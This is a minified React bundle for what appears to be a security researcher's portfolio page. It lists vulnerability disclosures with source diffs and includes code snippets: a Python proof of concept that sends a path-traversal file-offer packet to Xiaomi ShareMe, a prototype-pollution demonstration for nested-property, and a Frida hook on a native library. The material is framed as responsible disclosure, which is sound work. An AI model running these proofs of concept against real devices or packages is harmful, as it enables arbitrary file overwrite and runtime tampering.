 */const Xp=(...o)=>o.filter((e,i,s)=>!!e&&e.trim()!==""&&s.indexOf(e)===i).join(" ").trim();/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Wr={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":2,"stroke-linecap":"round","stroke-linejoin":"round"};/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function Qh(o){return o!=null}function F3(o,e={}){var _,E;const i=e.attributeNames??{},s=T=>i[T]??T,c=o.size??o.width??Wr.width,f=o.size??o.height??Wr.height,d=((_=o.aliases)==null?void 0:_.filter(T=>typeof T=="string"&&T.trim()!=="").map(T=>`lucide-${T}`))??[],h=[...o.name?[`lucide-${o.name}`]:[],...d],m=((E=e.className)==null?void 0:E.split(" ").filter(Boolean))??[],p=e.includeDefaultClasses===!1?Xp(...m):Xp("lucide",...h,...m),x=e.absoluteStrokeWidth?Number(e.strokeWidth??Wr["stroke-width"])*Number(o.size??o.width??Wr.width)/Number(e.size??e.width??Wr.width):e.strokeWidth??Wr["stroke-width"];return["svg",{...Object.entries(Wr).reduce((T,[w,y])=>(T[s(w)]=y,T),{}),..."color"in e&&e.color&&{[s("stroke")]:e.color},..."size"in e&&Qh(e.size)&&{[s("width")]:e.size,[s("height")]:e.size},..."width"in e&&Qh(e.width)&&{[s("width")]:e.width},..."height"in e&&Qh(e.height)&&{[s("height")]:e.height},[s("stroke-width")]:x,...p&&{[s("class")]:p},[s("viewBox")]:`0 0 ${c} ${f}`,...e.hasA11yProp===!1?{[s("aria-hidden")]:"true"}:{},..."attributes"in e&&e.attributes},o.node.map(T=>{const[w,y,S]=T,N=e.nonScalingStroke?{[s("vector-effect")]:"non-scaling-stroke",...y}:y;return S?[w,N,S]:[w,N]})]}/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function H3(o,e={}){return F3(o,{...e,attributeNames:{...e.attributeNames,class:"className","stroke-width":"strokeWidth","stroke-linecap":"strokeLinecap","stroke-linejoin":"strokeLinejoin","vector-effect":"vectorEffect"}})}/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const G3=o=>{for(const e in o)if(e.startsWith("aria-")||e==="role"||e==="title")return!0;return!1},V3=_n.createContext({}),X3=()=>_n.useContext(V3),k3=_n.forwardRef(({color:o,size:e,width:i,height:s,strokeWidth:c,absoluteStrokeWidth:f,nonScalingStroke:d,className:h="",children:m,iconNode:p=[],icon:x={node:p,aliases:[],size:24},...v},_)=>{const{size:E=24,strokeWidth:T=2,absoluteStrokeWidth:w=!1,nonScalingStroke:y=!1,color:S="currentColor",className:N=""}=X3()??{},B=!!m||G3(v),[C,U,D=[]]=H3(x,{color:o??S,width:i??e??E,height:s??e??E,strokeWidth:c??T,absoluteStrokeWidth:f??w,nonScalingStroke:d??y,className:Xp(N,h),hasA11yProp:B,attributes:v});return _n.createElement(C,{ref:_,...U},[...D.map(([P,b])=>_n.createElement(P,b)),...Array.isArray(m)?m:[m]])});/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function Pa(o,e=[],i=[]){const s=typeof o=="string"?I3(o,e,i):o,c=_n.forwardRef(({className:f,...d},h)=>_n.createElement(k3,{ref:h,icon:s,className:f,...d}));return s.name&&(c.displayName=B3(s.name)),c}/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const mS={name:"arrow-up-right",size:24,node:[["path",{d:"M7 7h10v10",key:"1tivn9"}],["path",{d:"M7 17 17 7",key:"1vkiza"}]]};mS.node;const hl=Pa(mS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const gS={name:"bug",size:24,node:[["path",{d:"M12 20v-9",key:"1qisl0"}],["path",{d:"M14 7a4 4 0 0 1 4 4v3a6 6 0 0 1-12 0v-3a4 4 0 0 1 4-4z",key:"uouzyp"}],["path",{d:"M14.12 3.88 16 2",key:"qol33r"}],["path",{d:"M21 21a4 4 0 0 0-3.81-4",key:"1b0z45"}],["path",{d:"M21 5a4 4 0 0 1-3.55 3.97",key:"5cxbf6"}],["path",{d:"M22 13h-4",key:"1jl80f"}],["path",{d:"M3 21a4 4 0 0 1 3.81-4",key:"1fjd4g"}],["path",{d:"M3 5a4 4 0 0 0 3.55 3.97",key:"1d7oge"}],["path",{d:"M6 13H2",key:"82j7cp"}],["path",{d:"m8 2 1.88 1.88",key:"fmnt4t"}],["path",{d:"M9 7.13V6a3 3 0 1 1 6 0v1.13",key:"1vgav8"}]]};gS.node;const W3=Pa(gS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const _S={name:"check",size:24,node:[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]]};_S.node;const Ex=Pa(_S);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const vS={name:"chevron-right",size:24,node:[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]};vS.node;const q3=Pa(vS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const xS={name:"copy",size:24,node:[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]]};xS.node;const bx=Pa(xS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const SS={name:"pause",size:24,node:[["rect",{x:"14",y:"3",width:"5",height:"18",rx:"1",key:"kaeet6"}],["rect",{x:"5",y:"3",width:"5",height:"18",rx:"1",key:"1wsw3u"}]]};SS.node;const Y3=Pa(SS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const yS={name:"play",size:24,node:[["path",{d:"M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z",key:"10ikf1"}]]};yS.node;const Z3=Pa(yS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const MS={name:"shield",size:24,node:[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]]};MS.node;const Tx=Pa(MS);/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ES={name:"terminal",size:24,node:[["path",{d:"M12 19h8",key:"baeox8"}],["path",{d:"m4 17 6-6-6-6",key:"1yngyt"}]]};ES.node;const K3=Pa(ES),Ax=({className:o="w-4 h-4"})=>J.jsxs("svg",{className:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[J.jsx("path",{d:"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"}),J.jsx("path",{d:"M9 18c-4.51 2-5-2-7-2"})]}),j3=()=>{const o=_n.useRef(null),[e,i]=_n.useState("matrix"),[s,c]=_n.useState(!1),[f,d]=_n.useState(60);return _n.useEffect(()=>{const h=o.current;if(!h)return;const m=h.clientWidth,p=h.clientHeight,x=new hb,v=new Ti(55,m/p,.1,1e3);v.position.set(0,25,65),v.lookAt(0,0,0);const _=new O3({antialias:!0,alpha:!0});_.setSize(m,p),_.setPixelRatio(Math.min(window.devicePixelRatio,2)),h.appendChild(_.domElement);const E=3600,T=new Float32Array(E*3),w=new Float32Array(E*3),y=new Float32Array(E*3);(gt=>{for(let Bt=0;Bt<E;Bt++){const Ut=Bt*3;let z=0,pt=0,At=0,Y=0,ut=0,Tt=0;if(gt==="matrix"){const wt=Math.pow(Math.random(),.6)*42+4,_t=Math.random()*Math.PI*2,Rt=Math.acos(Math.random()*2-1);z=wt*Math.sin(Rt)*Math.cos(_t),pt=wt*Math.sin(Rt)*Math.sin(_t)*.45,At=wt*Math.cos(Rt),Bt%30===0?(Y=.95,ut=.2,Tt=.35):Bt%2===0?(Y=.1,ut=.85,Tt=.55):(Y=.2,ut=.75,Tt=.98)}else if(gt==="lattice"){const wt=Math.random()*Math.PI*2,_t=Math.sqrt(Math.random())*30+5,Rt=(Math.random()-.5)*60;z=Math.cos(wt)*_t,pt=Rt,At=Math.sin(wt)*_t,Y=.15,ut=.9,Tt=.6}else{const wt=Math.random(),_t=Math.random(),Rt=wt*2*Math.PI,Le=Math.acos(2*_t-1),le=Math.cbrt(Math.random())*32;z=le*Math.sin(Le)*Math.cos(Rt),pt=le*Math.sin(Le)*Math.sin(Rt),At=le*Math.cos(Le),Y=.3,ut=.7,Tt=1}T[Ut]=z,T[Ut+1]=pt,T[Ut+2]=At,w[Ut]=Y,w[Ut+1]=ut,w[Ut+2]=Tt,y[Ut]=(Math.random()-.5)*.04,y[Ut+1]=(Math.random()-.5)*.04,y[Ut+2]=(Math.random()-.5)*.04}})(e);const N=new $n;N.setAttribute("position",new Fi(T,3)),N.setAttribute("color",new Fi(w,3));const B=new eS({size:1.5,vertexColors:!0,transparent:!0,opacity:.85,blending:$h,depthWrite:!1}),C=new Tb(N,B);x.add(C);const U=new im(7,1),D=new Rb(U),P=new tS({color:1096065,transparent:!0,opacity:.25}),b=new bb(D,P);x.add(b);let L=!1,F={x:0,y:0},V=0,$=.2;const ft=gt=>{L=!0,F={x:gt.clientX,y:gt.clientY}},j=gt=>{if(!L){const z=h.getBoundingClientRect(),pt=((gt.clientX-z.left)/z.width-.5)*2,At=((gt.clientY-z.top)/z.height-.5)*2;V=pt*.45,$=.2-At*.35;return}const Bt=gt.clientX-F.x,Ut=gt.clientY-F.y;V+=Bt*.007,$+=Ut*.007,F={x:gt.clientX,y:gt.clientY}},et=()=>{L=!1};h.addEventListener("mousedown",ft),window.addEventListener("mousemove",j),window.addEventListener("mouseup",et);const q=()=>{if(!h)return;const gt=h.clientWidth,Bt=h.clientHeight;v.aspect=gt/Bt,v.updateProjectionMatrix(),_.setSize(gt,Bt)};window.addEventListener("resize",q);let W,ht=0,lt=performance.now();const mt=()=>{W=requestAnimationFrame(mt),ht++;const gt=performance.now();if(gt-lt>=1e3&&(d(ht),ht=0,lt=gt),!s){C.rotation.y+=.0025,C.rotation.x+=($-C.rotation.x)*.05,C.rotation.y+=(V-C.rotation.y)*.05,b.rotation.x+=.004,b.rotation.y-=.005;const Bt=N.attributes.position,Ut=Bt.array;for(let z=0;z<E;z++){const pt=z*3;Ut[pt]+=y[pt],Ut[pt+1]+=y[pt+1],Ut[pt+2]+=y[pt+2]}Bt.needsUpdate=!0}_.render(x,v)};return mt(),()=>{cancelAnimationFrame(W),h.removeEventListener("mousedown",ft),window.removeEventListener("mousemove",j),window.removeEventListener("mouseup",et),window.removeEventListener("resize",q),_.dispose(),h.contains(_.domElement)&&h.removeChild(_.domElement)}},[e,s]),J.jsxs("div",{className:"relative w-full h-[400px] sm:h-[460px] rounded-3xl overflow-hidden border border-white/10 bg-gradient-to-b from-[#06060c] to-[#020204] shadow-2xl group",children:[J.jsx("div",{ref:o,className:"w-full h-full cursor-grab active:cursor-grabbing"}),J.jsxs("div",{className:"absolute top-4 left-4 flex items-center gap-2 pointer-events-none",children:[J.jsxs("div",{className:"flex items-center gap-1.5 px-3 py-1 rounded-full bg-black/70 border border-white/10 backdrop-blur-md text-xs font-mono",children:[J.jsx("span",{className:"w-2 h-2 rounded-full bg-emerald-400 animate-ping"}),J.jsx("span",{className:"text-white font-bold",children:"ATTACK GRAPH // TELEMETRY MESH"})]}),J.jsx("span",{className:"hidden sm:inline-block text-[11px] font-mono text-zinc-400 bg-black/50 px-2.5 py-1 rounded-full border border-white/5",children:"DRAG TO ROTATE IN 3D"})]}),J.jsx("div",{className:"absolute top-4 right-4 flex items-center gap-2 pointer-events-none font-mono text-xs",children:J.jsxs("div",{className:"px-3 py-1 rounded-full bg-black/70 border border-white/10 backdrop-blur-md text-zinc-300 flex items-center gap-2",children:[J.jsxs("span",{className:"text-emerald-400 font-bold",children:[f," FPS"]}),J.jsx("span",{className:"text-zinc-600",children:"|"}),J.jsx("span",{className:"text-cyan-400",children:"3,600 NODES"}),J.jsx("span",{className:"text-zinc-600",children:"|"}),J.jsx("span",{className:"text-rose-400",children:"500M+ AUDITED REACH"})]})}),J.jsxs("div",{className:"absolute bottom-4 left-4 right-4 flex items-center justify-between pointer-events-auto font-mono text-xs",children:[J.jsx("div",{className:"flex items-center gap-1.5 p-1 rounded-xl bg-black/80 border border-white/10 backdrop-blur-md",children:["matrix","lattice","core"].map(h=>J.jsx("button",{onClick:()=>i(h),className:`px-3 py-1 rounded-lg uppercase tracking-wider transition-all ${e===h?"bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-bold shadow-lg shadow-emerald-500/10":"text-zinc-400 hover:text-white hover:bg-zinc-800/60"}`,children:h==="matrix"?"Attack Surface":h==="lattice"?"Packet Stream":"Memory Mesh"},h))}),J.jsxs("button",{onClick:()=>c(!s),className:"flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-black/80 hover:bg-zinc-800 border border-white/10 backdrop-blur-md text-zinc-300 hover:text-white transition-all",children:[s?J.jsx(Z3,{className:"w-3.5 h-3.5 text-emerald-400"}):J.jsx(Y3,{className:"w-3.5 h-3.5 text-amber-400"}),J.jsx("span",{children:s?"Resume":"Pause"})]})]})]})},Jh=({children:o,className:e=""})=>{const i=_n.useRef(null),[s,c]=_n.useState(""),[f,d]=_n.useState({x:-1e3,y:-1e3}),h=p=>{if(!i.current)return;const x=i.current.getBoundingClientRect(),v=p.clientX-x.left,_=p.clientY-x.top,E=x.width/2,T=x.height/2,w=(_-T)/T*-8,y=(v-E)/E*8;c(`perspective(1000px) rotateX(${w}deg) rotateY(${y}deg) scale3d(1.015, 1.015, 1.015)`),d({x:v,y:_})},m=()=>{c("perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)"),d({x:-1e3,y:-1e3})};return J.jsxs("div",{ref:i,onMouseMove:h,onMouseLeave:m,style:{transform:s},className:`card-3d relative rounded-2xl overflow-hidden ${e}`,children:[J.jsx("div",{className:"pointer-events-none absolute inset-0 transition-opacity duration-300 opacity-0 group-hover:opacity-100",style:{background:`radial-gradient(400px circle at ${f.x}px ${f.y}px, rgba(16, 185, 129, 0.08), transparent 70%)`}}),o]})},Q3=[{id:"shareme",target:"Xiaomi ShareMe",installBase:"500M+ Installs",title:"Unauthenticated Exported IPC Arbitrary File Overwrite & Sandbox Escape",cwe:"CWE-862 (Missing Auth) + CWE-22 (Path Traversal)",severity:"CVSS 8.8 HIGH",protocol:"Xiaomi Security Response Center (MSRC)",summary:"Discovered an unauthenticated exported broadcast receiver in com.xiaomi.midrop handling incoming peer-to-peer file transfers over LAN. Because caller identity was not verified and destination directory tokens were uncanonicalized, any unprivileged local application could overwrite critical shared preferences and app cache via relative path traversal separators.",diff:`@@ -84,7 +84,10 @@ public class MiDropReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
-        String targetPath = intent.getStringExtra("dest_file");
-        FileOutputStream fos = new FileOutputStream(new File(targetPath));
+        // Vulnerable: Unauthenticated broadcast + uncanonicalized path traversal
+        String rawPath = intent.getStringExtra("dest_file");
+        String sanitized = PathUtils.canonicalizeAndSandbox(rawPath, context.getFilesDir());
+        FileOutputStream fos = new FileOutputStream(new File(sanitized));
     }`},{id:"elementor",target:"Elementor Website Builder",installBase:"5M+ Installs",title:"Missing Authorization in AI Handlers (Quota Drain & Prompt Disclosure)",cwe:"CWE-862 (Missing Authorization)",severity:"CVSS 6.3 MED",protocol:"Patchstack mVDP / CVE Program",summary:"Identified missing capability authorization checks in Elementor AI AJAX handlers (ai_get_custom_code, ai_get_history, ai_delete_history_item). While layout handlers enforce verify_permissions(), the code generation endpoints allowed any logged-in Subscriber role to deplete commercial AI credits and disclose unreleased business prompts.",diff:`@@ -142,6 +142,9 @@ public function ajax_ai_get_custom_code( $data ) {
-    // Missing authorization guard
-    return $this->connect->get_ai_code( $data['prompt'] );
+    if ( ! current_user_can( 'manage_options' ) ) {
+        throw new \\Exception( 'Unauthorized capability.' );
+    }
+    return $this->connect->get_ai_code( $data['prompt'] );
 }`},{id:"redux",target:"Redux Framework",installBase:"1M+ Installs",title:"Broken Access Control via Inverted Boolean Conjunction",cwe:"CWE-284 (Improper Access Control)",severity:"CVSS 5.3 MED",protocol:"Patchstack mVDP / CVE Program",summary:"Reverse-engineered authorization checks in class-redux-ajax-save.php. The handler checked !is_user_logged_in() && !current_user_can(). Because of the '&&' boolean conjunction, the capability check became completely dead code for any authenticated user with admin page access, permitting low-privilege persistence tampering.",diff:`@@ -210,5 +210,5 @@ public function ajax_save() {
-    // Flawed conjunction: if user is logged in, current_user_can() is bypassed
-    if ( ! is_user_logged_in() && ! current_user_can( $this->args['page_permissions'] ) ) {
+    if ( ! is_user_logged_in() || ! current_user_can( $this->args['page_permissions'] ) ) {
         wp_die( -1 );
     }`},{id:"wpdm",target:"WordPress Download Manager (WPDM)",installBase:"100k+ Installs",title:"Unauthenticated API Dispatch & Hardcoded Developer Credentials",cwe:"CWE-862 (Missing Auth) + CWE-798 (Hardcoded Credentials)",severity:"CVSS 5.3 MED",protocol:"Patchstack mVDP / CVE Program",summary:"Discovered that src/Admin/AdminController.php commented out authorization checks (// __::isAuthentic) in the wpdm_iconFinder endpoint. Furthermore, src/Admin/views/iconfinder.php shipped hardcoded third-party API credentials, allowing unauthenticated attackers to query external APIs using the site owner identity.",diff:`@@ -45,7 +45,8 @@ class AdminController {
     public function iconFinder() {
-        // __::isAuthentic(); // Commented out by vendor
+        if ( ! current_user_can( 'upload_files' ) ) {
+            wp_send_json_error( [ 'message' => 'Unauthorized' ], 403 );
+        }
         $query = sanitize_text_field( $_REQUEST['query'] );`},{id:"nested-property",target:"nested-property",installBase:"4M+ Downloads",title:"0-Day Incomplete Fix Prototype Pollution on Global Runtimes",cwe:"CWE-1321 (Improper Modification of Object Prototype)",severity:"0-DAY",protocol:"Open-Source Security Advisory",summary:"Demonstrated that patches for nested-property v4.0.0 only filtered the __proto__ token, permitting full constructor.prototype access chains. Allowed unauthenticated attackers to pollute Array.prototype and Function.prototype across Node.js runtime globals.",diff:`// Exploit Demonstration:
const nested = require('nested-property');
let payload = {};
nested.set(payload, 'constructor.prototype.polluted', true);
console.log({}.polluted); // Returns true (runtime globally poisoned)`}],Su=[{name:"shareme_ipc_poc.py",lang:"Python / Android SRE",desc:"Xiaomi ShareMe (500M+ installs) CWE-862 + CWE-22 IPC Traversal PoC",code:`# Target: Xiaomi ShareMe (com.xiaomi.midrop) v3.47.11
# Finding: Unauthenticated Exported IPC Broadcast -> Arbitrary External File Write
# Coordinated Disclosure: Xiaomi Security Response Center (MSRC)

import socket
import struct

def synthesize_tampered_payload(target_ip: str, target_port: int, victim_file: str):
    """
    ShareMe binds an unauthenticated LAN TCP daemon and fails to canonicalize
    the FileEntry destination path. Bypasses app boundary via relative traversal:
    '../../../../data/data/com.xiaomi.midrop/shared_prefs/settings.xml'
    """
    payload = struct.pack(
        ">IHH128s", 
        0x53484152, # MAGIC: 'SHAR'
        0x01,       # PROTOCOL_V1
        0x04,       # OP_FILE_OFFER
        victim_file.encode("utf-8").ljust(128, b"\\x00")
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.sendall(payload)
    print(f"[+] Exploitation packet dispatched to {target_ip}:{target_port} -> Triggered sink.")`},{name:"argus_gating_kernel.rs",lang:"Rust / Edge Defense",desc:"Senti_Argus sub-3ms Mixture-of-Experts packet evaluation engine",code:`pub struct MoERouter {
    threshold: f32,
    anomaly_gate: AnomalyGateNetwork,
    experts: Vec<Box<dyn PacketExpert + Send + Sync>>,
}

impl MoERouter {
    #[inline(always)]
    pub fn evaluate_flow(&self, vector: &FlowFeatures) -> Verdict {
        // Hardware fast-path Authenticode & CIDR short-circuit (<0.1ms)
        if vector.is_whitelisted() {
            return Verdict::Allow { latency_us: 42 };
        }

        let weights = self.anomaly_gate.infer_weights(vector);
        let composite_score: f32 = self.experts.iter().zip(weights)
            .map(|(e, w)| e.score(vector) * w)
            .sum();

        if composite_score >= self.threshold {
            Verdict::Drop { score: composite_score }
        } else {
            Verdict::Monitor
        }
    }
}`},{name:"anvil_frida_tracer.js",lang:"JavaScript / Frida",desc:"Project Anvil: ARM64 JNI memory integrity & anti-tamper observation hook",code:`// Project Anvil — Android Native SRE Dynamic Observation Hook
// Target: ARM64 libtoolChecker.so / libdedge.so

const targetLib = Process.findModuleByName("libtoolChecker.so");
if (targetLib) {
    const sym = targetLib.findExportByName("Java_com_xiaomi_midrop_util_SecurityBridge_verifyPayload");
    if (sym) {
        Interceptor.attach(sym, {
            onEnter: function(args) {
                console.log("[Anvil::JNI] verifyPayload() invoked.");
                console.log("  arg0 (JNIEnv*): " + args[0]);
                console.log("  arg2 (jstring target): " + Memory.readCString(args[2]));
            },
            onLeave: function(retval) {
                console.log("  -> Verification Return Value: " + retval);
            }
        });
    }
}`}];function J3(){const[o,e]=_n.useState(!1),[i,s]=_n.useState("shareme"),[c,f]=_n.useState(0),[d,h]=_n.useState(!1),m=()=>{navigator.clipboard.writeText("kidakabadiop2010@gmail.com"),e(!0),setTimeout(()=>e(!1),2e3)},p=x=>{navigator.clipboard.writeText(x),h(!0),setTimeout(()=>h(!1),2e3)};return J.jsxs("div",{className:"min-h-screen bg-[#030305] text-[#ededed] font-sans antialiased relative selection:bg-emerald-500/20 selection:text-emerald-300",children:[J.jsx("header",{className:"sticky top-4 z-50 max-w-5xl mx-auto px-4",children:J.jsxs("nav",{className:"rounded-full bg-black/70 backdrop-blur-xl border border-white/10 px-5 py-3 flex items-center justify-between shadow-2xl",children:[J.jsxs("div",{className:"flex items-center gap-3",children:[J.jsx("div",{className:"w-7 h-7 rounded-lg bg-gradient-to-tr from-emerald-500 to-cyan-400 flex items-center justify-center font-mono font-bold text-black text-xs shadow-lg shadow-emerald-500/20",children:"OM"}),J.jsxs("div",{className:"flex items-center gap-2 font-mono text-xs",children:[J.jsx("span",{className:"font-semibold text-white",children:"Ojas Mehta"}),J.jsx("span",{className:"text-zinc-500 hidden sm:inline",children:"// security researcher & systems"})]})]}),J.jsxs("div",{className:"flex items-center gap-4 text-xs font-mono",children:[J.jsxs("div",{className:"flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20",children:[J.jsx("span",{className:"w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"}),J.jsx("span",{children:"ACTIVE RESEARCH"})]}),J.jsxs("a",{href:"https://github.com/blah-blah-cell",target:"_blank",rel:"noreferrer",className:"flex items-center gap-1 text-zinc-400 hover:text-white transition-colors",children:[J.jsx(Ax,{className:"w-3.5 h-3.5"}),J.jsx("span",{className:"hidden sm:inline",children:"GitHub"}),J.jsx(hl,{className:"w-3 h-3 text-zinc-500"})]})]})]})}),J.jsxs("main",{className:"max-w-5xl mx-auto px-4 pt-8 pb-28 space-y-20",children:[J.jsxs("section",{className:"space-y-6 pt-4",children:[J.jsxs("div",{className:"space-y-3 max-w-3xl",children:[J.jsxs("div",{className:"inline-flex items-center gap-2 px-3 py-1 rounded-full bg-zinc-900/80 border border-zinc-800 text-xs font-mono text-zinc-400",children:[J.jsx(Tx,{className:"w-3.5 h-3.5 text-emerald-400"}),J.jsx("span",{children:"VULNERABILITY RESEARCH • REVERSE ENGINEERING • DEFENSIVE SYSTEMS"})]}),J.jsxs("h1",{className:"text-4xl sm:text-6xl font-extrabold tracking-tight text-white leading-[1.1]",children:["Uncovering critical flaws in ",J.jsx("span",{className:"text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400",children:"500M+ user infrastructure"}),"."]}),J.jsx("p",{className:"text-base sm:text-lg text-zinc-400 leading-relaxed pt-1",children:"Security researcher specializing in white-box source auditing, native ARM64 binary reverse engineering, and architecting low-latency edge intrusion defense runtimes."})]}),J.jsxs("div",{className:"grid grid-cols-2 sm:grid-cols-4 gap-3 font-mono text-xs",children:[J.jsxs("div",{className:"p-4 rounded-2xl bg-zinc-900/50 border border-white/[0.06]",children:[J.jsx("div",{className:"text-2xl sm:text-3xl font-bold text-white",children:"500M+"}),J.jsx("div",{className:"text-zinc-400 mt-1",children:"Audited User Surface"})]}),J.jsxs("div",{className:"p-4 rounded-2xl bg-zinc-900/50 border border-white/[0.06]",children:[J.jsx("div",{className:"text-2xl sm:text-3xl font-bold text-emerald-400",children:"CVSS 8.8"}),J.jsx("div",{className:"text-zinc-400 mt-1",children:"Highest Confirmed Severity"})]}),J.jsxs("div",{className:"p-4 rounded-2xl bg-zinc-900/50 border border-white/[0.06]",children:[J.jsx("div",{className:"text-2xl sm:text-3xl font-bold text-cyan-400",children:"<3ms"}),J.jsx("div",{className:"text-zinc-400 mt-1",children:"Edge MoE Defense Latency"})]}),J.jsxs("div",{className:"p-4 rounded-2xl bg-zinc-900/50 border border-white/[0.06]",children:[J.jsx("div",{className:"text-2xl sm:text-3xl font-bold text-rose-400",children:"5 Platforms"}),J.jsx("div",{className:"text-zinc-400 mt-1",children:"Responsible Disclosures"})]})]}),J.jsx(j3,{})]}),J.jsxs("section",{className:"space-y-6",children:[J.jsxs("div",{className:"flex items-center justify-between font-mono",children:[J.jsxs("div",{className:"text-xs uppercase tracking-widest text-zinc-400 font-bold flex items-center gap-2",children:[J.jsx(W3,{className:"w-4 h-4 text-rose-400"}),J.jsx("span",{children:"Verified Vulnerability Disclosures"})]}),J.jsx("span",{className:"text-xs text-zinc-500",children:"GROUND-TRUTH EXPLOITATION & DIFFS"})]}),J.jsx("div",{className:"space-y-4",children:Q3.map(x=>{const v=i===x.id;return J.jsxs("div",{className:`rounded-2xl bg-[#08080d] border transition-all overflow-hidden ${v?"border-rose-500/30 shadow-lg shadow-rose-500/5":"border-white/[0.08] hover:border-white/[0.18]"}`,children:[J.jsxs("div",{onClick:()=>s(v?null:x.id),className:"p-5 sm:p-6 flex items-start justify-between cursor-pointer group",children:[J.jsxs("div",{className:"space-y-1.5 pr-4",children:[J.jsxs("div",{className:"flex flex-wrap items-center gap-2",children:[J.jsx("span",{className:"text-base sm:text-lg font-bold text-white group-hover:text-rose-300 transition-colors",children:x.target}),J.jsx("span",{className:"text-xs font-mono text-zinc-500 bg-zinc-900 px-2 py-0.5 rounded border border-zinc-800",children:x.installBase})]}),J.jsx("div",{className:"text-sm text-zinc-300 font-medium",children:x.title}),J.jsx("div",{className:"text-xs font-mono text-zinc-500",children:x.cwe})]}),J.jsxs("div",{className:"flex items-center gap-3 shrink-0 font-mono text-xs pt-1",children:[J.jsx("span",{className:"px-2.5 py-1 rounded-md bg-rose-500/10 text-rose-400 border border-rose-500/20 font-bold",children:x.severity}),J.jsx(q3,{className:`w-4 h-4 text-zinc-500 transition-transform duration-200 ${v?"rotate-90 text-white":"group-hover:text-zinc-300"}`})]})]}),v&&J.jsxs("div",{className:"px-5 sm:px-6 pb-6 pt-2 space-y-4 border-t border-white/[0.06] font-mono text-xs",children:[J.jsxs("div",{children:[J.jsx("div",{className:"text-zinc-400 text-[11px] uppercase tracking-wider font-bold mb-1",children:"Vulnerability Mechanism & Impact"}),J.jsx("p",{className:"text-zinc-300 font-sans text-sm leading-relaxed",children:x.summary})]}),J.jsxs("div",{children:[J.jsx("div",{className:"text-zinc-400 text-[11px] uppercase tracking-wider font-bold mb-1",children:"Vulnerable vs. Remediated Source Diff"}),J.jsx("div",{className:"rounded-xl bg-black/90 border border-zinc-800 p-3.5 overflow-x-auto text-[11px] leading-relaxed",children:J.jsx("pre",{children:x.diff.split(`
